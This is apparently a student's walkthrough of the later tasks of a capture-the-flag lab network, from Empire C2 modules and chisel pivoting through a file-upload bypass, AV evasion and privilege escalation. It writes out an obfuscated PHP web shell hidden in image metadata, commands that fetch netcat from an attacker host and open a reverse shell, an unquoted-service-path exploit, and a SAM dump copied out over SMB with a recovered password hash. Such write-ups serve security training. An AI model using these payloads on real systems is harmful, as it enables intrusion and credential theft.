    php -S 0.0.0.0:18000 

Connect to `git-server` on `.150` and execute `usestager/multi/launcher`

jumpbox: 

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649027046960_image.png)


attacking:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649027067769_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649027083963_image.png)


**Answer Questions**



## Task 30  **Command and Control** Empire: Modules

Using the modules inside Empire on target machines with `usemodule`

**Sherlock - Module**

    usemodule powershell/privesc/sherlock

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649027928049_image.png)


Achieved with starkiller `modules`

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649027712192_image.png)



Read the above information and try to experiment with the Empire Modules available.

    No answer needed


## Task 31  Command and Control Empire: Interactive Shell

Interact with shell:

    interact YDBFS4R8
    shell

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649027992799_image.png)


starkiller:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649028063755_image.png)


**Answer the question**

Find and use the interactive shell in both the Empire CLI Client and in Starkiller.

    No answer needed



## Task 32  Command and Control Conclusion

The overarching take-aways from this section are:

- C2 Frameworks are used to consolidate access to a compromised machine, as well as streamline post-exploitation attempts
- There are many C2 Frameworks available, so look into which ones work best for your use case
- Empire is a good choice as a relatively well-rounded, open source C2 framework
- Empire is still in active development, with upgrades and new features being released frequently
- Starkiller is a GUI front-end for Empire which makes collaboration using the framework very easy


**Answer the questions**

Read the C2 Conclusion

    No answer needed


**[Bonus Exercise]** Try working through this section again, using a different C2 Framework of your choice. You can use the C2 matrix to help with this.

    No answer needed


# Personal PC - Enumeration


## Task 33  Personal PC Enumeration

upload nc to `.150` git-server using Evil-winRM:

    upload /usr/share/windows-binaries/nc.exe c:\temp\nc.exe

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649028538584_image.png)


upload `Invoke-Portscan.ps1` to `.150`

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649028725606_image.png)


Import `Invoke-Portscan.ps1` and test

    Import-Module c:\windows\temp\Invoke-Portscan.ps1
    Get-Help Invoke-Portscan

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649029734872_image.png)


Portscan:

    Invoke-Portscan -Hosts 10.200.90.100 -TopPorts 50

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649029799866_image.png)


Powershell Portscan One-liners:
https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/

**PowerShell** port scanner:

    1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null

**Test-Netconnection** scan a range of IPs for a single port:

    foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel "Detailed" 192.168.1.$ip}

**PS** IP range & port range scanner:

    1..20 | % { $a = $_; 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}

**PS** test egress filtering:

    1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("allports.exposed",$_)) "Port $_ is open!" } 2>$null

To create a PowerShell port scanner in one line we need to combine three distinct components. Creating a range of objects, looping through each object, and outputting information for each to the screen. In the case of PowerShell we can make use of its object oriented nature to facilitate this process.
**PowerShell** port scanner:

    1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null


**Answer questions**

Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?

    80,3389



## Task 34  Personal PC Pivoting

Moving to using chisel or Plink to connect to RDP.


**Open firewall rules**

    netsh advfirewall firewall add rule name="Chisel-exec2" dir=in action=allow protocol=tcp localport=44444

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649032826263_image.png)


**Setup Chisel**
on target:

    .\chisel_1.7.7_windows_amd64.exe server -p 44444 --socks5

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649032878447_image.png)


on attacking:

    ./chisel_1.7.7_linux_amd64 client 10.200.90.150:44444 9090:socks

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649034636007_image.png)


**Setup FoxyProxy**
Ensure you setup a `SOCKS5` proxy with foxyproxy:


![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649034669697_image.png)


**Navigate to page**

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649034772194_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649034787749_image.png)


**Answer the questions**

Whether you choose the recommended option or not, get a pivot up and running!

    No answer needed



Access the website in your web browser (using FoxyProxy if you used the recommended forward proxy, or directly if you used a port forward).
Using the Wappalyzer browser extension ([Firefox](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) | [Chrome](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en)) or an alternative method, identify the server-side Programming language (including the version number) used on the website.

    PHP 4.4.11

## Task 35  Personal PC The Wonders of Git

**Evil-WinRM Download**
From Jumpbox (.200) download `.git` file located at: `c:\Gitstack\Repositories\Website.git`


    download c:\Gitstack\repositories\Website.git /root/thm/wreath/Website.git

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649077322347_image.png)


**Answer the question**

Use your WinRM access to look around the Git Server. What is the absolute path to the `Website.git` directory?

    c:\Gitstack\repositories\Website.git

Use `evil-winrm` to download the entire directory.
From the directory above Website.git, use:
`download PATH\TO\Website.git`
Be warned -- this will take a while, but should complete after a minute or two!
***Note:*** *You may need to specify the local path as well as the absolute path to the Website.git directory!*

    No answer needed

Exit out of evil-winrm -- you should see that a new directory called Website.git has been created locally. If you enter into this directory you will see an oddly named subdirectory (the same as the answer to question 1 of this task).

    No answer needed

**Download GitTools**

    git clone https://github.com/internetwache/GitTool

The GitTools repository contains three tools:

- **Dumper** can be used to download an exposed `.git` directory from a website should the owner of the site have forgotten to delete it
- **Extractor** can be used to take a local `.git` directory and recreate the repository in a readable format. This is designed to work in conjunction with the Dumper, but will also work on the repo that we stole from the Git server. Unfortunately for us, whilst Extractor *will* give us each commit in a readable format, it will not sort the commits by date
- **Finder** can be used to search the internet for sites with exposed `.git` directories. This is significantly less useful to an ethical hacker, although may have applications in bug bounty programmes

**Move file to Website.git**
File was downloaded as `'c:\Gitstack\repositories\Website.git``'` and needs to be `.git`


    mv 'c:\Gitstack\repositories\Website.git' .git

**Use extractor within** `Website.git`**:**

    /opt/GitTools/Extractor/extractor.sh . Website

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649078075202_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649078123924_image.png)


**Commits**
as the commits are not in order need to create the order and `commit-meta.txt`

    separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649078200899_image.png)


If that didn't make sense, don't worry!
The short version is: the most up to date version of the site stored in the Git repository is in the `NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3` directory.

    No answer needed


## Task 36  **Personal PC** Website Code Analysis

Navigate to `/2-345ac8b236064b431fa43f53d91c98c4834ef8f3` and find php files

    find . -name "*.php"

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649078738412_image.png)


Investigate `index.php`

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649078834283_image.png)



**Answer the questions**
What does Thomas have to phone Mrs Walker about?

    neighbourhood watch meetings

This appears to be a file-upload point, so we might have the opportunity for a filter bypass here!
Additionally, the to-do list at the bottom of the page not only gives us an insight into Thomas' upcoming schedule, but it also gives us an idea about the protections around the page itself.
Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?

    basic auth

Which extensions are accepted (comma separated, no spaces or quotes)?

    jpg,jpeg,png,gif

Between lines 4 and 15:
`$target = "uploads/".basename($_FILES\["file"\]["name"]);`
`...`
`move_uploaded_file($_FILES\["file"\]["tmp_name"], $target);`

We can see that the file will get moved into an `uploads/` directory with it's original name, assuming it passed the two filters.
In summary:

- We know how to find our uploaded files
- There are two file upload filters in play
- Both filters are bypassable

We have ourselves a vulnerability!

    No answer needed



## Task 37  Personal PC Exploit PoC

Access `.100` target by pivoting through `.200` and chisel setup to `/resources/`
.100 Target

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649079681202_image.png)


Attacking:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649079707386_image.png)


Attacking Foxy Proxy `SOCKS5` proxy through port `9090`


login with: `Thomas:i<3ruby`

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649079759240_image.png)


**Add comment / payload to image with exiftool:**

    exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-exec.png.php 

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649081719036_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649081758333_image.png)


**Access uploaded image**
http://10.200.90.100/resources/uploads/test-exec.png.php

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649081818321_image.png)



## Task 38  AV Evasion Introduction

**Answer the questions**
Which category of evasion covers uploading a file to the storage on the target before executing it?

    On-Disk Evasion

What does AMSI stand for?

    Anti-Malware Scan Interface

Which category of evasion does AMSI affect?

    In-Memory evasion



## Task 39  AV Evasion AV Detection Methods

**Answer the questions**

What other name can be used for Dynamic/Heuristic detection methods?

    Behavioural


If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?

    Static


When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?

    Pre-defined rules

What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?

    Password



## Task 40  AV Evasion PHP Payload Obfuscation

PHP Payload

    <?php
        $cmd = $_GET["wreath"];
        if(isset($cmd)){
            echo "<pre>" . shell_exec($cmd) . "</pre>";
        }
        die();
    ?>


Obfuscate code with https://www.gaijin.at/en/tools/php-obfuscator

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649082217863_image.png)


obfuscated code:

    <?php $l0=$_GET["wreath"];if(isset($l0)){echo "<pre>".shell_exec($l0)."</pre>";}die();?>

actions needed to escape dollar signs

    <?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>

**Add comment to image with exiftool**

    exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-exec.png.php

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649082491579_image.png)

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649082528373_image.png)


Access shell:

    http://10.200.90.100/resources/uploads/shell-exec.png.php
![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649082556842_image.png)


Test access:

    http://10.200.90.100/resources/uploads/shell-exec.png.php?wreath=whoami
![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649082616718_image.png)


Systeminfo:

    http://10.200.90.100/resources/uploads/shell-exec.png.php?wreath=systeminfo
![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649082663002_image.png)


**Answer questions**

What is the Host Name of the target?

    wreath-pc

What is our current username (include the domain in this)?

    wreath-pc\thomas



## Task 41  AV Evasion Compiling Netcat & Reverse Shell!

**Clone repository**

    git clone https://github.com/int0x33/nc.exe/

install mingw-w64

    sudo apt install mingw-w64

Inside the `nc.exe/Makefile` needed to be edited to point to new compiler

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649084160036_image.png)


`make` new nc with mingw-w64 compiler

    make 2>/dev/null x86_64-w64-mingw32-gcc -DNDEBUG -DWIN32 -D_CONSOLE -DTELNET -DGAPING_SECURITY_HOLE getopt.c doexec.c netcat.c -s -lkernel32 -luser32 -lwsock32 -lwinmm -o nc.exe


    file nc.exe

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649084466363_image.png)


**Bonus Question (optional):** Follow the steps detailed above to compile a copy of netcat.exe (otherwise use the copy already in the repo).

    No answer needed


With a copy of netcat available, we now need to get it up to the target.
Start a Python webserver on your attacking machine (as demonstrated numerous times previously):
`sudo python3 -m http.server 80`

    No answer needed

What output do you get when running the command: `certutil.exe`?

    CertUtil: -dump command completed successfully.

**Download nc on target**

    10.200.90.100/resources/uploads/shell-exec.png.php?wreath=curl http://10.50.91.32/nc64.exe -o c:\\windows\temp\\nc-exec.exe

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649086561897_image.png)


**Return shell from target**

    powershell.exe c:\\windows\\temp\\nc-exec.exe 10.50.91.32 443 -e cmd.exe

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649086582536_image.png)



## Task 42  **AV Evasion** Enumeration



    Whoami /priv

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649086640318_image.png)


**Answer questions**

Use the command `whoami /priv`.
**[Research]** One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?

    SeImpersonatePrivilege


**whoami groups**

    whoami /groups

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649086742539_image.png)


**Enumerate services**

    wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649086820788_image.png)


What is the Name (second column from the left) of this service?

    SystemExplorerHelpService

Is the service running as the local system account (Aye/Nay)?

    Aye

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649086960978_image.png)


**Check permissions of service**

    powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649087027566_image.png)


We have full control over this directory! How strange, but hey, Thomas' security oversight will allow us to root this target.

    No answer needed

**Bonus Question (optional):** Try to get a copy of WinPEAS up to the target (either the obfuscated executable file, or the batch variant) and run it. You will see that there are many more potential vulnerabilities on this target -- mainly due to patches that haven't been installed.

    No answer needed


## Task 43  AV Evasion Privilege Escalation

**Install Mono on kali**

    apt install mono-devel

Create a file `Wrapper.cs`

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649087993710_image.png)


compile with `msc`

    mcs Wrapper.cs
![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649088302371_image.png)


transfer to target:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649088362681_image.png)


Using Impacket setup smb share

    sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword

From target connect to SMB Share

    net use \\10.50.91.32\share /USER:USER s3cureP@ssword

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649088533849_image.png)


move wrapper to location of smb share and copy to target

    copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.ex

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649088699466_image.png)


delete share

    net use \\10.50.91.32\share /del

Test Wrapper.exe

    "%TEMP%\wrapper-exec.exe"

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649088879939_image.png)


functions correctly and returns a shell without being disabled by Antivirus.

**Unquoted Service Path Exploit**

vulnerable service path: `C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`

copy wrapper to `C:\Program Files (x86)\System Explorer\System.exe`

    copy %TEMP%\wrapper-exec.exe "C:\Program Files (x86)\System Explorer\System.exe"

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649089068731_image.png)


Stop/Start Service

    sc stop SystemExplorerHelpService
    sc start SystemExplorerHelpService
![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649089151604_image.png)


Returns `nt authority/system` shell:

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649089181854_image.png)



## Task 44  Exfiltration Exfiltration Techniques & Post Exploitation

**Answer the questions**


Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?

    Nay

For what reason is HTTPS preferred over HTTP during exfiltration?

    encryption


**Save SAM/SYSTEM Files**

    reg.exe save HKLM\SAM sam.bak
    reg.exe save HKLM\SYSTEM system.bak

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649089391345_image.png)


Transfer to attacking machine via SMB Share

NOTE: *System error 1312 can usually be solved by connecting using an arbitrary domain. For example, specifying* `/USER:domain\user` *rather than just the username. The same SMB server will still work here; however, Windows sees it as a different user account and thus allows the new connection.*

reestablish with: `net use \\10.50.91.32\share2 /USER:user s3cureP@ssword`

move files:

    move sam.bak \\10.50.91.32\share2\sam.bak
    move system.bak \\10.50.91.32\share2\system.bak

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649089773872_image.png)


**Dump hashes with secretsdump.py**

    secretsdump.py -sam sam.bak -system system.bak LOCAL 

![](https://paper-attachments.dropbox.com/s_AA3ECD4DEB7CCFEEB9E9A8742F598F315528988491FA0985E2201EB5CF96B23F_1649090151586_image.png)

What is the Administrator NT hash for this target?

    a05c3c807ceeb48c47252568da284cd2

Remove all the tools, shells, payloads, accounts, and any other remnants you left behind.

    No answer needed


## Task 45  Conclusion Debrief & Report

**Answer questions**

Write a report (or just read the information in the task).
Wrote this writeup as a debreif to help fellow cybersecurity professionals.

Consider the following brief to be the "report-handling procedures" for this assignment:
*Reports should be written in English and submitted as PDFs hosted on Github, Google Drive or somewhere else on the internet to be viewed in the browser with no downloads required. Reports should not contain answers to questions, as far as is possible (i.e. host names are fine, passwords or password hashes are not). As you are being encouraged to write these in the format of a penetration test report, writeups submitted in other formats will* not *be accepted to the room. If you want to do a video walkthrough of the network then this can be linked to at the end of an otherwise complete PDF report.*

    No answer needed


## Task 46  **Conclusion** Final Thoughts

Outstanding box would highly recommend to new to advanced security practitioner.

-exec
